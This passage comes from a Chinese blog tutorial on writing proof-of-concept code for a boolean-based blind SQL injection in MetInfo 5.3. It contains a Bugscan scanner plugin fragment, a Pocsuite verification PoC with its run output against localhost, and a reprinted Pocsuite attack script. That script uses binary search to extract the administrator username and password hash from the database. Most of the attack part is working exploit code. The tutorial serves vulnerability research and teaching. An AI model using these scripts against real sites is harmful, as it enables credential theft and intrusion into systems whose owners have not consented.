&apos;&amp;serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))&gt;0,1,0)%20limit%201--%20sd&amp;imgproduct=xxxx&apos;</span><br><span class="line">    # 条件假</span><br><span class="line">    verify = arg + &apos;news&apos; + m.group(1) + &apos;&amp;serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))&gt;255,1,0)%20limit%201--%20sd&amp;imgproduct=xxxx&apos;</span><br><span class="line"></span><br><span class="line">    code, head, payload_res, err, _ = curl.curl2(payload)</span><br><span class="line">    if code != 200:</span><br><span class="line">        return False</span><br><span class="line">    code, head, verify_res, err, _ = curl.curl2(verify)</span><br><span class="line">    if code != 200:</span><br><span class="line">        return False</span><br><span class="line">    # 判断页面中是否有新闻</span><br><span class="line">    pattern = re.compile(r&apos;&lt;h2&gt;&lt;a href=[\&apos;&quot;]?[./a-zA-Z0-9_-]*shownews.php\?&apos;)</span><br><span class="line">    if pattern.search(payload_res) and pattern.search(verify_res) is None:</span><br><span class="line">        security_hole(arg + &apos; metinfo cms news.php blind sql injection&apos;)</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    from dummy import *</span><br><span class="line">    audit(assign(&apos;metinfo&apos;, &apos;http://www.example.com/&apos;)[1])</span><br></pre></td></tr></table></figure>
+<p>可以看出作者先访问 /news/index.php 取得了 classid，然后再继续测试的。相比之下，代码 <code>2_3_2.py</code> 比<code>2_3_3.py</code>少发一次请求。</p>
+<blockquote>
+<p>不要小看这一次请求哟，我们平均访问一次网页假设要消耗 100ms, 1s = 1000 ms, 如果我们待扫描的目标有 10w，那么这个小改动会帮你节省接近 3 个小时(100000 * 100 / 1000 / 3600 = 2.78)。</p>
+</blockquote>
+<h3 id="2-3-5-基于-Pocsuite-框架-验证加攻击"><a href="#2-3-5-基于-Pocsuite-框架-验证加攻击" class="headerlink" title="2.3.5 基于 Pocsuite 框架 验证加攻击"></a>2.3.5 基于 Pocsuite 框架 验证加攻击</h3><p>Bugscan 是扫描器，我在开篇的时候讲过，扫描器是要求无损扫描的，如果有注入，一定不要去把人家管理员密码给人注出来,但是在 Pocsuite 里面的话，提供了一种带有攻击性质的验证逻辑。</p>
+<p>我们先写 PoC 中验证逻辑部分吧，带有攻击性质的这个暂且不表，我会在后面补上的。</p>
+<p>代码 <code>2_3_4.py</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding: utf-8</span><br><span class="line">from pocsuite.net import req</span><br><span class="line">from pocsuite.poc import POCBase, Output</span><br><span class="line">from pocsuite.utils import register</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TestPOC(POCBase):</span><br><span class="line">    vulID = &apos;89367&apos;</span><br><span class="line">    version = &apos;1.0&apos;</span><br><span class="line">    author = [&apos;Anonymous&apos;]</span><br><span class="line">    vulDate = &apos;2015-06-15&apos;</span><br><span class="line">    createDate = &apos;2016-01-28&apos;</span><br><span class="line">    updateDate = &apos;2016-01-28&apos;</span><br><span class="line">    references = [&apos;http://www.seebug.org/vuldb/ssvid-89367&apos;]</span><br><span class="line">    name = &apos;MetInfo 5.3 /include/global/listmod.php SQL注入&apos;</span><br><span class="line">    appPowerLink = &apos;http://www.metinfo.cn/&apos;</span><br><span class="line">    appName = &apos;MetInfo&apos;</span><br><span class="line">    appVersion = &apos;5.3&apos;</span><br><span class="line">    vulType = &apos;SQL injection&apos;</span><br><span class="line">    desc = &apos;&apos;&apos;</span><br><span class="line">        search_sql 变量没有过滤直接带入 SQL 语句导致注入，</span><br><span class="line">        可以获取管理员的账号密码，造成信息泄露甚至数据库被拖。</span><br><span class="line"></span><br><span class="line">        Boolean-Based Blind SQL injection</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    samples = [&apos;http://www.lzqidi.com/&apos;]</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        return self._verify()</span><br><span class="line"></span><br><span class="line">    def _verify(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        payloadtrue = &quot;&#123;target&#125;/news/index.php?&quot;\</span><br><span class="line">            &quot;serch_sql=%20123qwe%20&quot;\</span><br><span class="line">            &quot;where%201234%3D1234%20--%20x&amp;imgproduct=xxxx&quot;.format(</span><br><span class="line">                target=self.url)</span><br><span class="line"></span><br><span class="line">        payloadfalse = &quot;&#123;target&#125;/news/index.php?&quot;\</span><br><span class="line">            &quot;serch_sql=%20123qwe%20&quot;\</span><br><span class="line">            &quot;where%201234%3D1235%20--%20x&amp;imgproduct=xxxx&quot;.format(</span><br><span class="line">                target=self.url)</span><br><span class="line">        try:</span><br><span class="line">            resptrue = req.get(payloadtrue)</span><br><span class="line">            if resptrue.status_code != 200 or not\</span><br><span class="line">                    re.search(</span><br><span class="line">                        &apos;href=[&quot;\&apos; ]shownews\.php\?lang=&apos;,</span><br><span class="line">                        resptrue.content, re.M):</span><br><span class="line">                return self.parse_output(result)</span><br><span class="line">            respfalse = req.get(payloadfalse)</span><br><span class="line">            if respfalse.status_code != 200 or\</span><br><span class="line">                    re.search(</span><br><span class="line">                        &apos;href=[&quot;\&apos; ]shownews\.php\?lang=&apos;,</span><br><span class="line">                        respfalse.content, re.M):</span><br><span class="line">                return self.parse_output(result)</span><br><span class="line">            result[&apos;VerifyInfo&apos;] = &#123;&#125;</span><br><span class="line">            result[&apos;VerifyInfo&apos;][&apos;URL&apos;] = payloadtrue</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    def parse_output(self, result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&apos;Internet nothing returned&apos;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(TestPOC)</span><br></pre></td></tr></table></figure>
+<p>将代码 <code>2_3_4.py</code> 保存到本地后用 Pocsuite 运行测试。</p>
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  2-3  pocsuite -r 2_3_4.py -u 127.0.0.1/Metinfo/</span><br><span class="line"></span><br><span class="line">                              ,--. ,--.</span><br><span class="line"> ,---. ,---. ,---.,---.,--.,--`--,-&apos;  &apos;-.,---.  &#123;1.0.0dev-a2ea8ba&#125;</span><br><span class="line">| .-. | .-. | .--(  .-&apos;|  ||  ,--&apos;-.  .-| .-. :</span><br><span class="line">| &apos;-&apos; &apos; &apos;-&apos; \ `--.-&apos;  `&apos;  &apos;&apos;  |  | |  | \   --.</span><br><span class="line">|  |-&apos; `---&apos; `---`----&apos; `----&apos;`--&apos; `--&apos;  `----&apos;</span><br><span class="line">`--&apos;                                            http://sebug.net</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of pocsuite for attacking targets without prior mutual consent is illegal.</span><br><span class="line"></span><br><span class="line">[*] starting at 15:06:42</span><br><span class="line"></span><br><span class="line">[15:06:42] [*] checking 2_3_4</span><br><span class="line">[15:06:42] [*] poc:&apos;2_3_4&apos; target:&apos;127.0.0.1/Metinfo/&apos;</span><br><span class="line">[15:06:42] [+] poc-89367 &apos;MetInfo 5.3 /include/global/listmod.php SQL注入&apos; has already been detected against &apos;http://127.0.0.1/Metinfo/&apos;.</span><br><span class="line">[15:06:42] [+] URL : http://127.0.0.1/Metinfo//news/index.php?serch_sql=%20123qwe%20where%201234%3D1234%20--%20x&amp;imgproduct=xxxx</span><br><span class="line">+--------------------+----------+--------+-----------+---------+---------+</span><br><span class="line">|     target-url     | poc-name | poc-id | component | version |  status |</span><br><span class="line">+--------------------+----------+--------+-----------+---------+---------+</span><br><span class="line">| 127.0.0.1/Metinfo/ |  2_3_4   | 89367  |  MetInfo  |   5.3   | success |</span><br><span class="line">+--------------------+----------+--------+-----------+---------+---------+</span><br><span class="line">success : 1 / 1</span><br><span class="line"></span><br><span class="line">[*] shutting down at 15:06:42</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>读者可以再次对比一下无框架 PoC 和有框架 PoC 的区别。</p>
+</blockquote>
+<p>基本上验证就已经讲完了，有兴趣的可以继续看下面的爆数据部分。</p>
+<p><strong>盲注猜数据</strong></p>
+<blockquote>
+<p>暂时不想写怎么爆数据了,后面会更, 我给个思路，读者可以先自己实现一下</p>
+</blockquote>
+<p><strong>思路</strong></p>
+<p>我们不要着急，一层一层思考啊</p>
+<ol>
+<li>管理员的用户名和密码肯定是在 [a-zA-Z0-9] 这个集合里面的(如果不区分大小写就是 [a-Z0-9])。比如 <code>e10adc3949ba59abbe56e057f20f883e</code></li>
+<li>如果让你人工去猜这个密码字符串，你会怎么猜？这里我们就可以用 if 语句来判断了，如果我们猜对了，就返回 True,猜错了，就返回 False，那么一旦出现了有数据的页面，说明你猜对了。</li>
+<li>一次猜整个字符串的那概率相当之小，所以我们可以拆分字符串呀，从第一个字符开始猜，猜到最后一个。那假设你在猜第 1 个字符，它可取的值有 36 个，怎么猜？从 a 一个一个猜到 z ，从 0 猜到 9，肯定有一个满足条件的。</li>
+<li><p>天呐，这样一个一个猜好累啊。有什么办法能提高比较效率呢？这里我们可以使用二分法(也叫折半查找)</p>
+<blockquote>
+<p>举个例子子来说啊，比如我们要猜 1 中给的这个例子的第 1 个字符(e)，我先看它是不是在 n 后面(a-z 的中间字母)？不在，好，然后再看是不是在 g 后面(a-n 的中间字母)？不在，那我将 a-g 再从中间分一下，就是字母 d 了，在不在 d 后面呢？在。OK,现在这个字符所在的区间是 d-g(defg),中间字母是 e ，那么这个字符在不在 e 后面呢？不在。于是现在区间又成了 de, 那么再比较一次, 这样就把猜出来是 e 了。</p>
+</blockquote>
+</li>
+</ol>
+<p>这样对一个字母，平均比较次数是 5 次，这样一来就会节约了大量的时间。你也许会说，呵呵呵，如果我猜的字母是 a ，我用传统的比较法一次就蒙对了呢。少年，那你有考虑过这个字符有可能是 z 吗？</p>
+<p>当然 Seebug 平台上已经有人写了这个漏洞的 PoC 了，这个 PoC 里面就运用了二分法思路来猜数据。</p>
+<p><a href="https://www.seebug.org/vuldb/ssvid-89367" target="_blank" rel="external">Sebug MetInfo 5.3 /include/global/listmod.php SQL注入</a></p>
+<p>我把 PoC 代码也贴上来，让读者参考一下(侵权删):</p>
+<p>代码 <code>2_3_5.py</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding: utf-8</span><br><span class="line">import re</span><br><span class="line">from pocsuite.net import req</span><br><span class="line">from pocsuite.poc import POCBase, Output</span><br><span class="line">from pocsuite.utils import register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TestPOC(POCBase):</span><br><span class="line">    vulID = &apos;1902&apos;  # vul ID</span><br><span class="line">    version = &apos;1&apos;</span><br><span class="line">    author = [&apos;ricter&apos;]</span><br><span class="line">    vulDate = &apos;2015-06-15&apos;</span><br><span class="line">    createDate = &apos;2015-06-16&apos;</span><br><span class="line">    updateDate = &apos;2015-06-16&apos;</span><br><span class="line">    references = [&apos;http://wooyun.org/bugs/wooyun-2015-0119166&apos;]</span><br><span class="line">    name = &apos;MetInfo 5.3 /include/global/listmod.php SQL注入漏洞 POC&apos;</span><br><span class="line">    appPowerLink = &apos;http://www.metinfo.cn&apos;</span><br><span class="line">    appName = &apos;MetInfo&apos;</span><br><span class="line">    appVersion = &apos;5.3&apos;</span><br><span class="line">    vulType = &apos;SQL Injection&apos;</span><br><span class="line">    desc = &apos;&apos;&apos;</span><br><span class="line">        变量直接带入 SQL 语句导致注入，可以获取管理员的账号密码，造成</span><br><span class="line">        信息泄露。</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    samples = [&apos;&apos;]</span><br><span class="line"></span><br><span class="line">    def get_flag(self, payload, offset, opt, char):</span><br><span class="line">        payload = (&apos;as a left join met_admin_table as b on 1 where ord(substr(&apos;</span><br><span class="line">                   &apos;%s,%s,1))%s%s and b.id = 1 limit 1#&apos; % (payload, offset,</span><br><span class="line">                   opt, char))</span><br><span class="line">        params = &#123;</span><br><span class="line">            &apos;lang&apos;: &apos;cn&apos;,</span><br><span class="line">            &apos;class2&apos;: 5,</span><br><span class="line">            &apos;imgproduct&apos;: &apos;z&apos;,</span><br><span class="line">            &apos;serch_sql&apos;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = req.get(&apos;%s/news/news.php&apos; % self.url, params=params)</span><br><span class="line">        return &apos;shownews.php&apos; in response.content</span><br><span class="line"></span><br><span class="line">    def fetch_data(self, payload, offset):</span><br><span class="line">        low, height = 0, 255</span><br><span class="line">        while low &lt;= height:</span><br><span class="line">            mid = (low + height) / 2</span><br><span class="line">            if self.get_flag(payload, offset, &apos;&gt;&apos;, mid):</span><br><span class="line">                if self.verbose:</span><br><span class="line">                    print &apos;&gt;&apos;, mid</span><br><span class="line">                low = mid + 1</span><br><span class="line">            elif self.get_flag(payload, offset, &apos;=&apos;, mid):</span><br><span class="line">                if self.verbose:</span><br><span class="line">                    print &apos;=&apos;, mid</span><br><span class="line">                return mid</span><br><span class="line">            else:</span><br><span class="line">                if self.verbose:</span><br><span class="line">                    print &apos;&lt;&apos;, mid</span><br><span class="line">                height = mid - 1</span><br><span class="line"></span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        username, password = [], []</span><br><span class="line">        offset = 0</span><br><span class="line">        while 1:</span><br><span class="line">            offset += 1</span><br><span class="line">            data = self.fetch_data(&apos;b.admin_id&apos;, offset)</span><br><span class="line">            if not data:</span><br><span class="line">                break</span><br><span class="line">            username.append(chr(data))</span><br><span class="line"></span><br><span class="line">        offset = 0</span><br><span class="line">        while 1:</span><br><span class="line">            offset += 1</span><br><span class="line">            data = self.fetch_data(&apos;b.admin_pass&apos;, offset)</span><br><span class="line">            if not data:</span><br><span class="line">                break</span><br><span class="line">            password.append(chr(data))</span><br><span class="line"></span><br><span class="line">        if len(password) == 32 and username:</span><br><span class="line">            result[&apos;AdminInfo&apos;] = &#123;&#125;</span><br><span class="line">            result[&apos;AdminInfo&apos;][&apos;Username&apos;] = &apos;&apos;.join(username)</span><br><span class="line">            result[&apos;AdminInfo&apos;][&apos;Password&apos;] = &apos;&apos;.join(password)</span><br><span class="line"></span><br><span class="line">        return self.parse_attack(result)</span><br><span class="line"></span><br><span class="line">    def _verify(self):</span><br><span class="line">        return self._attack()</span><br><span class="line"></span><br><span class="line">    def parse_attack(self, result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&apos;Internet nothing returned&apos;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(TestPOC)</span><br></pre></td></tr></table></figure>
+<p>要写一个没有人工参与的，尽可能的准确的攻击脚本还是略麻烦的，与其是自己实现，还不如你直接换 sqlmap 去更方便一些。</p>
+<blockquote>
+<p>这里我不禁想提几个问题出来</p>
+<ol>
+<li>什么是 Attack?</li>
+<li>Attack 中到底要达到什么样子的效果呢？注出 CMS 的管理员账号密码？注几个？注出数据库连接账号？如果有写文件权限是不是要写 shell 上去呢？写了 shell 要不试试提权吧？提了权要不再放个后门搞个免杀？…… </li>
+<li>如果对方的表前缀不是 met_ 呢？</li>
+</ol>
+<p>我就是想太多，这个 Attack 其实在实际当中并没什么太大的用处。</p>
+</blockquote>
+<h3 id="2-3-6-总结"><a href="#2-3-6-总结" class="headerlink" title="2.3.6 总结"></a>2.3.6 总结</h3><p>总结一下这节学到的东西</p>
+<ol>
+<li>布尔类型的 SQL 盲注,一般通过比较返回页面的数据变化来判断</li>
+<li>SQL 注入检测是证明指令被执行了</li>
+<li>编写 PoC 如果能结合 CMS 的具体特点，会通用，提高性能</li>
+<li>适当的应用一些算法，可以在幅度提高检测效率，节约时间</li>
+<li>不要用默认的表前缀在一定程度上可以提高被黑的门槛</li>
+</ol>
+<hr>
+<blockquote>
+<p>2016/01/27 感谢 SuperCheng 提供原始稿件</p>
+</blockquote>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PoC/" rel="tag">#PoC</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/04/12/funny_things_152/" rel="prev">进入妹子电脑偷照片和密码实录</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/12/27/poc_coding_2/" rel="next">PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 上篇)</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="2016/01/27/poc_coding_3/"
+                   data-title="PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 中篇)" data-url="http://blog.evalbug.com/2016/01/27/poc_coding_3/">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Medici.Yan" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">Medici.Yan</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">不是路人甲的闲人丁,娱乐型选手</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">26</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-name">分类</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">24</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/medicean" target="_blank">Weibo</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/medicean" target="_blank">GitHub</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+            <p class="site-author-name">Friends</p>
+            
+              <span class="links-of-author-item">
+              <a href="http://antoor.github.io" target="_blank">蚁逅</a>
+              </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blog.l1n3.net" target="_blank">LinE</a>
+              </span>
+            
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-基于布尔的盲注的-SQL-注入-PoC-编写"><span class="nav-number">1.</span> <span class="nav-text">2.3 基于布尔的盲注的 SQL 注入 PoC 编写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-1-漏洞分析"><span class="nav-number">1.1.</span> <span class="nav-text">2.3.1 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-2-漏洞复现"><span class="nav-number">1.2.</span> <span class="nav-text">2.3.2 漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-3-无框架-PoC-编写"><span class="nav-number">1.3.</span> <span class="nav-text">2.3.3 无框架 PoC 编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-4-基于-Bugscan-框架的扫描插件编写"><span class="nav-number">1.4.</span> <span class="nav-text">2.3.4 基于 Bugscan 框架的扫描插件编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-5-基于-Pocsuite-框架-验证加攻击"><span class="nav-number">1.5.</span> <span class="nav-text">2.3.5 基于 Pocsuite 框架 验证加攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-6-总结"><span class="nav-number">1.6.</span> <span class="nav-text">2.3.6 总结</span></a></li></ol></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright" >
+  
+  &copy; &nbsp;  2015 - 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Medici.Yan</span>
+</div>
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"medicean"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+     
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
